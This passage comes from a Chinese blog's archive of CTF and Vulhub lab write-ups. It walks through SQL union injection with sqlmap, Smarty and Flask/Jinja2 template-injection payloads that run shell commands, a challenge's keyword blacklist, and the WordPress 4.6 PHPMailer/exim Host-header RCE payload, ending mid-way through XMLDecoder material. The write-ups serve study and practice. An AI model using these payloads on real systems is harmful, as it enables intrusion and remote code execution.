1,2,3\n\n直接查询情况如下，可以看到，相当于直接创建了一个与`1,2,3`有关的表，字段数为输入的数字个数，即3个，对应数据也能理解\n\n![image-20230110175654372](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110175654372.png)\n\n而当和联合查询`union select`相结合使用的时候，就需要输入的这些字段数和另一个表的字段数一样才会正常查询\n\n比如某个表如下\n\n![image-20230110180052010](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110180052010.png)\n\n联合查询语句\n\n```sql\nSELECT * FROM activity union select 1,2,3,4;\n```\n\n![image-20230110180123723](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110180123723.png)\n\n相当于把两个表进行合并，而如果字段数不一致，就会出错，比如减去一个字段数\n\n```sql\nSELECT * FROM activity UNION SELECT 1,2,3;\n```\n\n![image-20230110180254544](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110180254544.png)\n\n可以看到查询字段数不一致的错误，这里也就是为什么之前需要判断表有几个字段的原因。\n\n### 结合查询\n\n把前一张表置空，也就是`where wllm=xx`，`xx`不存在的时候，前一张表查出来自然就是空的。\n\n然后再联合查询`select 1,2,3...`，依据返回数据，判断回显点在哪个字段\n\n```sql\nwllm=xx' union select 1,2,3--+\n```\n\n![image-20230110180737312](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110180737312.png)\n\n即可知道回显的数据在第2，3两个字段，那么就依据这两个字段，进行相关数据查询，这里就从第2个字段入手。\n\n## 4.查询库名\n\n利用`database()`函数来查询\n\n```sql\nwllm=xx' union select 1,database(),3--+\n```\n\n![image-20230110181009012](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110181009012.png)\n\n库名为`test_db`\n\n## 5.查询表名\n\n利用`group_concat()`函数来查询\n\n```sql\nwllm=xx' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='test_db'--+\n```\n\n可以看到，这里想要提供库的名字`test_db`，所以之前需要查询到库名。\n\n这里也有一点前置知识，也就是`information_schema`是`mysql`中的一个信息数据库，保存着关于`MySQL`服务器所维护的所有其他数据库的信息。比如数据库名，数据库的表，表栏的数据类型与访问权限等。\n\n参考：[(48条消息) mysql自带的information_schema.tables是什么？_你的小伙伴啊的博客-CSDN博客](https://blog.csdn.net/weixin_38972910/article/details/86012110)\n\n那么即可查询到\n\n![image-20230110181442257](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110181442257.png)\n\n可以看到存在两个表为`test_tb`和`users`\n\n## 6.查询字段名\n\n方法和查询表名类似，需要提供表名，之前查表名的原因\n\n```sql\nwllm=-xx' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='test_tb'--+\n```\n\n结果如下\n\n![image-20230110181822291](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110181822291.png)\n\n## 7.查询数据\n\n方法类似，查询`flag`内容\n\n```sql\nwllm=xx' union select 1,group_concat(flag),3 from test_tb--+ \n```\n\n得到最终`flag`\n\n![image-20230110182041851](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110182041851.png)\n\n## SQLMAP\n\n```shell\npython .\\sqlmap.py -u \"http://1.14.71.254:28374/?wllm=1\" -dbs\n#得到所有数据库名\n\npython .\\sqlmap.py -u \"http://1.14.71.254:28374/?wllm=1\" -D test_db --tables\n#得到库test_db中的所有表名字\n\npython .\\sqlmap.py -u \"http://1.14.71.254:28374/?wllm=1\" -D test_db -T test_db --columns\n#得到库test_db中test_db表中的所有字段名字，这个跑不出来\n\npython .\\sqlmap.py -u \"http://1.14.71.254:28374/?wllm=1\" -D test_db -T test_db -C flag -dump\n#跑不出来\n```\n\n# [CISCN 2019华东南]Web11\n\n看到这两个，猜测是`smarty`的`Server Side Template Injection`即`SSTI`模板注入，这个就需要一些前置知识了。\n\n![image-20230111154621041](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230111154621041.png)\n\n## 前置知识\n\n简单安装使用：[(48条消息) windows环境下smarty安装最简明教程_enjoyxp的博客-CSDN博客](https://blog.csdn.net/enjoyxp/article/details/2050325)\n\n参考：[Smarty 模板注入与沙箱逃逸-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/272393#h3-12)\n\n首先应该是为什说`smarty`能够进行模板注入，其实主要在于它的`string`模板，也就是如下的代码\n\n```php\n$smarty->display(\"string:{phpinfo()}\");\n```\n\n### 前期调用链\n\n前期会有一些链子调用到关键函数\n\n```\ndisplay\nSmarty_Internal_TemplateBase._execute\n\nSmarty_Internal_Template.render\n//这里会进行模板是否存在的检测，不存在就直接返回了，这里的模板指的是`string:{phpinfo()}`中的`string`，然后就会进行模板的一些处理\n\nSmarty_Template_Compiled.render\n//这里也会进行模板检测，不太清楚和前面有啥区别\n\nSmarty_Template_Compiled.process\n//这个函数比较关键，后续基本都是从这里展开的\n```\n\n### 模板创建\n\n当最开始没有进行该模板创建时，会创建模板，在前期调用链中还有后续的一些链子\n\n```\nSmarty_Template_Compiled.compileTemplateSource\n//创建\nSmarty_Template_Compiled.loadCompiledTemplate\n//创建完成之后加载调用\n```\n\n下面分析更多\n\n调用到`Smarty_Template_Compiled.compileTemplateSource`函数，然后在`write`函数中\n\n![image-20230111164052011](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230111164052011.png)\n\n回调到`Smarty_Internal_TemplateCompilerBase.compileTemplate`\n\n![image-20230111164116060](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230111164116060.png)\n\n里面调用`create`函数再回调到`Smarty_Internal_TemplateCompilerBase.compileTemplateSource`函数\n\n![image-20230111164320942](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230111164320942.png)\n\n该函数最终会调用`getContent`函数，依据不同的`handler`调用到不同类的处理函数中，比如`string`对应的类就是`Smarty_Internal_Resource_String`，会调用到其`decode`函数进行相关内容处理\n\n![image-20230111164515198](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230111164515198.png)\n\n比如这里的这里提到的例子里面的`string`就是`{phpinfo()}`，相关处理后就直接返回内容，然后在后续的操作中，将该内容连同一些数据写入到指定的`templates_c`文件夹中`hash`之后的一个`php`文件，这里就会如下结果\n\n```php\n<?php\n/* Smarty version 4.3.0, created on 2023-01-11 16:48:16\n  from 'ce7370c7e6956f1e6a18ad78cf4f6e48dabb61b3' */\n\n/* @var Smarty_Internal_Template $_smarty_tpl */\nif ($_smarty_tpl->_decodeProperties($_smarty_tpl, array (\n  'version' => '4.3.0',\n  'unifunc' => 'content_63be77d0cad990_36655883',\n  'has_nocache_code' => false,\n  'file_dependency' => \n  array (\n  ),\n  'includes' => \n  array (\n  ),\n),false)) {\nfunction content_63be77d0cad990_36655883 (Smarty_Internal_Template $_smarty_tpl) {\necho phpinfo();\n}\n}\n```\n\n然后在后续的`Smarty_Template_Compiled.loadCompiledTemplate`中会对该文件进行包含，执行其中的`php`代码，这里可能是因为`smarty`一些机制原因，必定在包含的时候能够执行到里面对应的那个函数。\n\n![image-20230111165045717](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230111165045717.png)\n\n### 模板调用\n\n当存在该模板，也就是`string:{phpinfo()}`对应的模板，就会在`Smarty_Template_Compiled.process`函数中，也就是如下红框中，直接进行对应的模板文件包含，同样也是可以执行代码的。\n\n![image-20230111171930724](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230111171930724.png)\n\n### 其他类模板\n\n前面提到的是`string`类的模板，同样也可能会有自定义的，比如如下\n\n参考：[[CVE-2017-1000480\\]Smarty <= 3.1.32 php代码执行 漏洞分析 | Chybeta](https://chybeta.github.io/2018/01/23/CVE-2017-1000480-Smarty-3-1-32-php代码执行-漏洞分析/)\n\n```php\nclass test extends Smarty_Resource_Custom\n{\n    protected function fetch($name,&$source,&$mtime)\n    {\n        $source = $name;\n        $mtime = time();\n    }\n}\n\n$smarty->display(\"test:{phpinfo()}\");\n```\n\n这里的`$name`就是对应的`{phpinfo()}`，将其赋值给`$source`从而在后续的`smarty`处理中形成对应的`content`，因为在`write`过程中之前提到会有`getContent`的调用，使用自定义类`Smarty_Resource_Custom`就会调用到该类的`fetch`函数，传入的`source`就是`content`，从而为`content`赋值。\n\n## 漏洞形式\n\n常见的漏洞形式如下\n\n```php\n$data = $_REQUEST['data'];\n$smarty->display(\"string:\".$data);\n```\n\n这样`data`就是可控的，那么相关的代码执行就是水到渠成了。\n\n## 题目\n\n相对于这道题就可以猜测了，大概就是会接收我们的`ip`，然后和它的模板进行拼接然后输出，其实测试一下就可以了。\n\n![image-20230111174624907](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230111174624907.png)\n\n很明显，可以代码执行，即可完成\n\n```\n{system('ls /')}\n{system('cat /flag')}\n```\n\n具体看看代码，放个木马上去下载一下\n\n```php\n<?php\n\nrequire 'smarty/libs/Smarty.class.php';\n$smarty = new Smarty;\n$smarty->debugging = false;\n$smarty->caching = false;\n$smarty->assign('foo','value');\n    if(isset($_SERVER)){    \n        if(isset($_SERVER[\"HTTP_X_FORWARDED_FOR\"])){\n           $real_ip = $_SERVER['HTTP_X_FORWARDED_FOR'];\n        }elseif(isset($_SERVER[\"HTTP_CLIENT_IP\"])) {\n           $real_ip = $_SERVER['HTTP_CLIENT_IP'];\n        }else{\n            $real_ip = $_SERVER['REMOTE_ADDR'];\n        }\n    }else{\n        if(getenv(\"HTTP_X_FORWARDED_FOR\")){\n              $real_ip = getenv( \"HTTP_X_FORWARDED_FOR\");\n        }elseif(getenv(\"HTTP_CLIENT_IP\")) {\n              $real_ip = getenv(\"HTTP_CLIENT_IP\");\n        }else{\n              $real_ip = getenv(\"REMOTE_ADDR\");\n        }\n    }\n$template_string = '<html lang=\"en\"><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n    <title>A Simple IP Address API</title>\n    <link rel=\"stylesheet\" href=\"./css/bootstrap.min.css\">\n</head>\n<body>\n<div class=\"container\">\n    <div class=\"row\">\n        <div style=\"float:left;\">\n            <h1>IP</h1>\n            <h2 class=\"hidden-xs hidden-sm\">A Simple Public IP Address API</h2>\n        </div>\n\t\t<div style=\"float:right;margin-top:30px;\">Current IP:'.$real_ip.'\t\t</div>\n    </div>\n\n    <div class=\"why row\">\n        <div class=\"col-xs-12\">\n            <h2>Why use?</h2>\n            <div class=\"row\">\n                <div class=\"col-xs-offset-1 col-xs-10\">\n                    <p>\n                        Do you need to get the public IP address ? Do you have the requirements to obtain the servers’ public IP address? Whatever the reason,sometimes a public IP address API are useful.\n                    </p>\n                    <p>\n                        You should use this because:\n                    </p><ul>\n                    <li>You can initiate requests without any limit.</li>\n                    \n                    <li>Does not record the visitor information.</li>\n                    \n                    </ul>\n                    <p></p>\n                </div>\n            </div>\n        </div>\n    </div>\n    <div class=\"api row\">\n        <div class=\"col-xs-12\">\n            <h2>API Usage</h2>\n            <div class=\"row\">\n                <div class=\"col-xs-offset-1 col-xs-11\">\n                    \n                    <div class=\"table-responsive\">\n                        <table class=\"table table-striped table-bordered table-hover\">\n                            <thead>\n                            <tr>\n                                <td>-</td>\n                                <td>API URI</td>\n                                <td width=\"50px\">Type</td>\n                                <td>Sample Output</td>\n                            </tr>\n                            </thead>\n                            <tbody>\n                            <tr>\n                                <td>get IP</td>\n                                <td><code>http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'].'api</code></td>\n                                <td><code>text/html</code></td>\n                                <td><code>8.8.8.8</code></td>\n                            </tr>\n                            <tr>\n                                <td>get XFF(X-Forwarded-For)</td>\n                                <td><code>http://' .$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'].'xff</code></td>\n                                <td><code>text/html</code></td>\n                                <td><code>8.8.8.8</code></td>\n                            </tr>\n                            \n                            \n                            </tbody>\n                        </table>\n                    </div>\n\n                    \n                </div>\n            </div>\n        </div>\n    </div>\n    <div class=\"examples row\">\n        \n    </div>\n\n    <div class=\"row\">\n        <div class=\"col-xs-12\">\n            <h2 style=\"margin-bottom:0;\">Connection</h2>\n            <div class=\"row\">\n                <div class=\"col-xs-offset-1 col-xs-10\">\n                    <h3>Request-Header</h3>\n                    <pre>GET / HTTP/2.0\nHost: www.ip.la\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8\nCache-Control: max-age=0\nDnt: 1\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36\n\n</pre>\n                </div>\n            </div>\n        </div>\n    </div>\n    <footer>\n        <p style=\"text-align:center;font-size:14px;\">Build With Smarty !</p>\n    </footer>\n</div>\n\n</body></html>';\n\n$smarty->display('string:'.$template_string); \n\n?>\n```\n\n可以看到`$template_string`中包含了我们可以控制的`$real_ip`\n\n# [NISACTF 2022]midlevel\n\n和上一道题一模一样，不太懂意义在哪里\n\n# [NISACTF 2022]is secret\n\n![image-20230112155550917](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112155550917.png)\n\n试试输入`secret`\n\n![image-20230112155613805](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112155613805.png)\n\n看来还得输入参数\n\n![image-20230112155641182](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112155641182.png)\n\n随便输点，发现报错了\n\n![image-20230112155719927](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112155719927.png)\n\n依据报错信息可以判断用的是`python2`下`flask`，报错信息中有比较关键的部分\n\n```\nFile \"/app/app.py\", line 35, in secret\na=render_template_string(safe(deS))\n```\n\n这个函数`render_template_string`通常和`SSTI`模板注入有关，和之前的`php`中的相关模板注入有点类似，而且在火狐浏览器中居然可以点开查看代码，在`edge`和`chrome`都不行\n\n![image-20230112161329622](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112161329622.png)\n\n可以看到，那个`secret`应该是我们控制的，因为没有`secret`的时候，确实输出了那个文字，有了就会输出其他的。\n\n中间看代码，将输入的`secret`通过`rc4`进行解密，那个`HereIsTreasure`应该就是密钥，然后字节放入`render_template_string`函数中，那么就肯定存在`SSTI`模板注入\n\n## 前置知识\n\n了解`flask`的`SSTI`还是需要一些前置知识的，如下代码示例\n\n```python\n@app.route('/test')\ndef test_ssti():\n    template = \"{{'abc'.__class__}}\"\n    return render_template_string(template)\n```\n\n当访问`ip:port/test`时，出现如下情况\n\n![image-20230112162026870](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112162026870.png)\n\n返回了一个类名字，这个其实就相当于在`python`里面执行了`'abc'.__class__`\n\n![image-20230112162115798](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112162115798.png)\n\n那么对应的，这个标签`{{xxx}}`，修改里面的`xxx`，即可获得任意`python`代码执行的能力。但是这里的代码执行和正常的`python`还是有点区别的，比如如下\n\n```python\n@app.route('/test')\ndef test_ssti():\n    template = \"{{print('aaaa')}}\"\n    return render_template_string(template)\n```\n\n就会出现如下情况\n\n![image-20230112162739395](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112162739395.png)\n\n原因就在于使用的模板引擎是`jinja2`，它有自己的一套规则，基本的语法如下\n\n- 控制结构 `{% %}`\n- 变量取值 `{{ }}`\n- 注释 `{# #}`\n\n那么将刚刚的示例修改一下\n\n```python\n@app.route('/test')\ndef test_ssti():\n    template = \"{% for i in range(3) %}\" \\\n               \"{{i}}\" \\\n               \"{% endfor %}\"\n    return render_template_string(template)\n```\n\n访问之后效果如下\n\n![image-20230112163519711](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112163519711.png)\n\n可以看到相当于执行了对应的`jinja2`代码，那么针对`flask`的`SSTI`模板注入，其实质就是执行`jinja2`代码。\n\n而相对于`jinja2`代码执行，用的最多的就是变量`{{i}}`取值，利用变量取值就可以获取到`python`里面各式各样的类和其中对应的方法，那么传入相关参数就能调用到相关的`python`代码了呀。\n\n比如最开始的`'abc'.__class__`，可以通过它来获取到基类`object`然后获取到后面的对应所有需要的类\n\n![image-20230112164326132](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112164326132.png)\n\n而很常用的`popen`函数，就会在某个类里存在，那么就需要去寻找，比如在`python3`里面有`'abc'.__class__.__base__.__subclasses__()[134].__init__.__globals__['popen']`\n\n![image-20230112164500524](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112164500524.png)\n\n那么对应传入参数就可以执行函数了，常用形式如下\n\n```\n'abc'.__class__.__base__.__subclasses__()[134].__init__.__globals__['popen']('ipconfig').read()\n```\n\n这些相关常用属性也有相关总结，参考：\n\n[(48条消息) SSTI知识点与题型_zbbjya的博客-CSDN博客_ssti大全](https://blog.csdn.net/zbbjya/article/details/124185476)\n\n[python 沙箱逃逸与SSTI ~ Misaki's Blog (misakikata.github.io)](https://misakikata.github.io/2020/04/python-沙箱逃逸与SSTI/#python2)\n\n```\n__class__            类的一个内置属性，表示实例对象的类。\n__base__             类型对象的直接基类\n__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__\n__mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。\n__subclasses__()     返回这个类的子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.\n__init__             初始化类，返回的类型是function\n__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。\n__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里\n__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。\n__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a['b']，就是a.__getitem__('b')\n__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。\n__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__('os').popen('ls').read()]\n__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。\nurl_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。\nget_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。\nlipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：{{lipsum.__globals__['os'].popen('ls').read()}}\ncurrent_app          应用上下文，一个全局变量。\n\nrequest              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__['__builtins__'].open('/proc\\self\\fd/3').read()\nrequest.args.x1   \t get传参\nrequest.values.x1 \t 所有参数\nrequest.cookies      cookies参数\nrequest.headers      请求头参数\nrequest.form.x1   \t post传参\t(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)\nrequest.data  \t\t post传参\t(Content-Type:a/b)\nrequest.json\t\t post传json  (Content-Type: application/json)\nconfig               当前application的所有配置。此外，也可以这样{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}\ng                    {{g}}得到<flask.g of 'flask_ssti'>\n```\n\n## 题目\n\n那么有了前置知识，这个就很好做了，利用相关的`payload`即可，在`flask`中有一个很常用的`config`\n\n```python\n@app.route('/test')\ndef test_ssti():\n    template = \"{{config}}\"\n    return render_template_string(template)\n```\n\n![image-20230112165239719](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112165239719.png)\n\n上面总结也有提到，如下`payload`\n\n```\nconfig.__class__.__init__.__globals__['os'].popen('ls').read()\n```\n\n但是这里还存在一个`rc4`加解密，使用不知道哪位师傅的脚本即可解决\n\n```python\nimport base64\nfrom urllib import parse\n\ndef rc4_main(key = \"init_key\", message = \"init_message\"):\n    # print(\"RC4加密主函数\")\n    s_box = rc4_init_sbox(key)\n    crypt = str(rc4_excrypt(message, s_box))\n    return  crypt\n\ndef rc4_init_sbox(key):\n    s_box = list(range(256))  # 我这里没管秘钥小于256的情况，小于256不断重复填充即可\n    # print(\"原来的 s 盒：%s\" % s_box)\n    j = 0\n    for i in range(256):\n        j = (j + s_box[i] + ord(key[i % len(key)])) % 256\n        s_box[i], s_box[j] = s_box[j], s_box[i]\n    # print(\"混乱后的 s 盒：%s\"% s_box)\n    return s_box\n\ndef rc4_excrypt(plain, box):\n    # print(\"调用加密程序成功。\")\n    res = []\n    i = j = 0\n    for s in plain:\n        i = (i + 1) % 256\n        j = (j + box[i]) % 256\n        box[i], box[j] = box[j], box[i]\n        t = (box[i] + box[j]) % 256\n        k = box[t]\n        res.append(chr(ord(s) ^ k))\n    # print(\"res用于加密字符串，加密后是：%res\" %res)\n    cipher = \"\".join(res)\n    #print(\"加密后的字符串是：\\n%s\" %cipher)\n    enc_url = parse.quote(cipher)\n    print(\"加密后的url编码:\\n\" + enc_url)\n    #print(\"加密后的输出(经过base64编码):\")\n    #print(str(base64.b64encode(cipher.encode('utf-8')), 'utf-8'))\n    return (str(base64.b64encode(cipher.encode('utf-8')), 'utf-8'))\n\nrc4_main(\"HereIsTreasure\",'''{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}''')\n```\n\n## 题外话\n\n在获取到网站源码之后，发现其实是有黑名单过滤的\n\n```python\n@app.route('/secret',methods=['GET','POST'])\ndef secret():\n    def safe(s):\n        black=['class','mro','subclasses','read','args','form','write', 'mro',  '<', '>', '|', 'join' 'os', 'sys', 'pop', 'del', 'rm', 'eval', 'exec', 'ls', 'cat', ';', '&&', 'catch_warnings', 'func_globals', 'pickle', 'import', 'subprocess', 'commands', 'input', 'execfile', 'reload', 'compile', 'execfile', 'kill', 'func_code' ]\n        for i in black:\n            if i in s:\n                return '\\''+ i +'\\' is not allowed. Secret is ' + s\n        return s\n    secret=request.args.get('secret')\n    if(secret==None):\n        return 'Tell me your secret.I will encrypt it so others can\\'t see'\n    rc=rc4_Modified.RC4(\"HereIsTreasure\")   #解密\n    deS=rc.do_crypt(secret)\n\n    a=render_template_string(safe(deS))\n\n    if 'ciscn' in a.lower():\n        return 'flag detected!'\n    return a\n```\n\n但是他这个过滤，其实只是给我们的输入加了一些字符，比如里面有`class`，就会变成`'class' is not allowed. Secret is xxxx`，而在`jinja2`里，对于普通的字符，即不符合语法规则的字符，是会原样输出的，比如如下代码\n\n```python\n@app.route('/test')\ndef test_ssti():\n    template = \"1234213{{'abc'.__class__.__base__.__subclasses__()[134].__init__.__globals__['popen']('ipconfig').read()}}\"\n    return render_template_string(template)\n```\n\n访问结果如下\n\n![image-20230112170040620](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112170040620.png)\n\n其实对于代码执行一点影响没有，相当于只是一个网站的文本字符而已。\n\n最终`payload`如下\n\n```\n{{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}\n```\n\n","tags":["NSSCTF"],"categories":["WEB","入门"]},{"title":"Vulhub刷题","url":"/2023/03/07/VulHub刷题/","content":"\n\n\n\n\n# wordpress-pwnscriptum\n\n## 漏洞原理\n\n### wordpress部分\n\n`wordpress`在发送邮件的时候，调用的是如下代码\n\n```php\n//wordpress-4.6 wp-includes pluggable.php 350\n\n$from_name = apply_filters( 'wp_mail_from_name', $from_name );\n\n$phpmailer->setFrom( $from_email, $from_name );\n```\n\n这里的`$from_email`是可控的，实质就是`http`中传入的`Host`字段经过一些过滤得到的，如下\n\n```php\n//wordpress-4.6 wp-includes pluggable.php 324\nif ( !isset( $from_email ) ) {\n    // Get the site domain and get rid of www.\n    $sitename = strtolower( $_SERVER['SERVER_NAME'] );\n    if ( substr( $sitename, 0, 4 ) == 'www.' ) {\n        $sitename = substr( $sitename, 4 );\n    }\n\n    $from_email = 'wordpress@' . $sitename;\n}\n\n/**\n\t * Filters the email address to send from.\n\t *\n\t * @since 2.2.0\n\t *\n\t * @param string $from_email Email address to send from.\n\t */\n$from_email = apply_filters( 'wp_mail_from', $from_email );\n```\n\n这个`$_SERVER['SERVER_NAME']`就是传入的`Host`字段。\n\n### phpmailer部分\n\n之前讲到的`$phpmailer->setFrom( $from_email, $from_name );`，调用的就是`phpmailer`组件的相关代码，该函数如下\n\n```php\n//phpmailer-5.2.10 class.phpmailer.php\npublic function setFrom($address, $name = '', $auto = true)\n{\n    $address = trim($address);\n\t//......中间是一些校验`$address`的,以及无关代码,本人水平太低,不太会绕过,直接略过,具体可看p神的\n    if ($auto) {\n        if (empty($this->Sender)) {\n            $this->Sender = $address;\n        }\n    }\n    return true;\n}\n```\n\n然后当在`wordpress`中调用`phpmailer.send()`发送邮件时，对应代码如下\n\n```php\npublic function send()\n{\n    try {\n        if (!$this->preSend()) {\n            return false;\n        }\n        return $this->postSend();\n    } catch (phpmailerException $exc) {\n        $this->mailHeader = '';\n        $this->setError($exc->getMessage());\n        if ($this->exceptions) {\n            throw $exc;\n        }\n        return false;\n    }\n}\n```\n\n这个`$this->preSend()`一般不会影响到后续，返回的总是`True`，从而调用到`postSend`\n\n其漏洞对应本质是`CVE-2016-10033`，参考：[PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass (legalhackers.com)](https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.html)\n\n即`PHPMailer`这个组件在使用的时候，由于参数没有进行好的过滤，导致最终的代码执行。\n\n参考：[phpmailer RCE漏洞分析 · LoRexxar's Blog](https://lorexxar.cn/2016/12/28/cve-2016-10030/)\n\n\n\n**mark**没有完整\n\n\n\n\n\n使用`popen`，然后`sendmail`实际在安装了`exim4`之后，是一个软连接，连接到`exim4`\n\n![image-20230206115600945](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230206115600945.png)\n\n而`exim4`可以进行命令执行\n\n![image-20230206115744705](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230206115744705.png)\n\n通过一些正则绕过等，就可以得到最终的`payload`，需要知道一个用户名，在用邮件验证的时候进行。\n\n创建`/tmp/success`\n\n```\ntarget(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}success}} null)\n```\n\n对应脚本`P神`的`vulhub`里的\n\n```python\ndef generate_command(command):\n    command = '${run{%s}}' % command\n    command = command.replace('/', '${substr{0}{1}{$spool_directory}}')\n    command = command.replace(' ', '${substr{10}{1}{$tod_log}}')\n    return 'target(any -froot@localhost -be %s null)' % command\nhost_data = generate_command('/bin/bash /tmp/rce')\n```\n\n最好是放在`burpsuite`进行，不然容易出错。\n\n[WordPress Core 4.6 - Unauthenticated Remote Code Execution (RCE) PoC Exploit (exploitbox.io)](https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html)\n\n\n\n\n\n# Weblogic\n\n## 前置知识\n\n### XMLDecoder反序列化\n\n参考如下：https://www.freebuf.com/articles/web/321222.html\n\n即`XMLDecoder`这个组件，可以将对象进行序列化生成特定格式文件`xx.xml`，然后通过反序列化该`xx.xml`可以得到对应的对象。\n\n如上述链接提到的`Person`类\n\n```java\npublic class Person {\n    private String name;\n    private int age;\n\n    //必须要有一个无参构造方法，要不会在序列化的过程中报错\n    public Person() {\n    }\n\n    public Person(String name, int age) {\n        this.name = name;\n        this.age = age;\n    }\n\n    public String getName() {\n        System.out.println(\"getName\");\n        return name;\n    }\n\n    public void setName(String name) {\n        System.out.println(\"setName\");\n        this.name = name;\n    }\n\n    public int getAge() {\n        System.out.println(\"getAge\");\n        return age;\n    }\n\n    public void setAge(int age) {\n        System.out.println(\"setAge\");\n        this.age = age;\n    }\n\n    @Override\n    public String toString() {\n        return \"Person{\" +\n                \"name='\" + name + '\\'' +\n                \", age=\" + age +\n                '}';\n    }\n}\n```\n\n其中的`get/set`方法在序列化时会调用到，反序列化时只会调用`set`方法，如果没有，相关的成员属性的值会丢失。\n\n通过`XMLDecode`序列化生成如下格式文件\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<java version=\"11.0.9\" class=\"java.beans.XMLDecoder\">\n <object class=\"Person\">\n  <void property=\"age\">\n   <int>18</int>\n  </void>\n  <void property=\"name\">\n   <string>test</string>\n  </void>\n </object>\n</java>\n```\n\n之后进行反序列化即可得到对应的`Person`对象，相关代码如下\n\n```java\nimport java.beans.XMLDecoder;\nimport java.beans.XMLEncoder;\nimport java.io.*;\n\n\npublic class test {\n    public static Object decode() {\n        File file = new File(test.class.getClassLoader().getResource(\"\").getPath() + \"config.xml\");\n        XMLDecoder xmlDecoder = null;\n        try {\n            xmlDecoder = new XMLDecoder(new BufferedInputStream(new FileInputStream(file)));\n            //反序列化对象\n            Object o = xmlDecoder.readObject();\n            return o;\n        } catch (Exception e) {\n            e.printStackTrace();\n            return null;\n        } finally {\n            if (xmlDecoder != null) {\n                xmlDecoder.close();\n            }\n        }\n    }\n\n\n    public static void encode(Object o) {\n        XMLEncoder xmlEncoder = null;\n        try {\n            File file = new File(test.class.getClassLoader().getResource(\"\").getPath() + \"config.xml\");\n            xmlEncoder = new XMLEncoder(new BufferedOutputStream(new FileOutputStream(file)));\n            //序列化对象\n            xmlEncoder.writeObject(o);\n            xmlEncoder.flush();\n        } catch (FileNotFoundException e) {\n            e.printStackTrace();\n        } finally {\n            xmlEncoder.close();\n        }\n    }\n\n\n    public static void main(String[] args) throws FileNotFoundException {\n        Person person = new Person(\"test\", 